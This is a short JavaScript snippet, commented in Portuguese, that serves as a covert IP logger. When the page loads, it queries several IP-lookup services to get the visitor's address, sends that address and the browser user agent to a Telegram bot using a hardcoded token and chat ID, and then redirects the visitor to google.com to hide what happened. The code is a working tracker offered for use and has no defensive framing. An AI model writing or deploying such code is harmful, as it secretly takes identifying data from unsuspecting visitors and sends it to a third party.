<script>
  const TOKEN = "8536635132:AAGU7VibS5L3GkZ9WYDjMsRhbKs_XQlBbGA";
  const CHAT_ID = "8053770740";
  const REDIRECT = "https://google.com"; // Seu link de destino

  async function capturar() {
    let ip = "N/A";
    
    // Lista de provedores para evitar bloqueio
    const providers = [
      'https://api.ipify.org?format=json',
      'https://ipapi.co/json/',
      'https://ip-api.com/json/'
    ];

    for (let url of providers) {
      try {
        const res = await fetch(url);
        const data = await res.json();
        ip = data.ip || data.query || ip;
        if (ip !== "N/A") break; // Se pegou o IP, para de procurar
      } catch (e) { continue; }
    }

    const msg = `WORM WEB LOG\nIP: ${ip}\nUA: ${navigator.userAgent}`;
    const botUrl = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;

    // Beacon é ignorado pelo cache, ele sempre envia
    navigator.sendBeacon(botUrl);

    setTimeout(() => {
      window.location.href = REDIRECT;
    }, 800);
  }

  capturar();
</script>
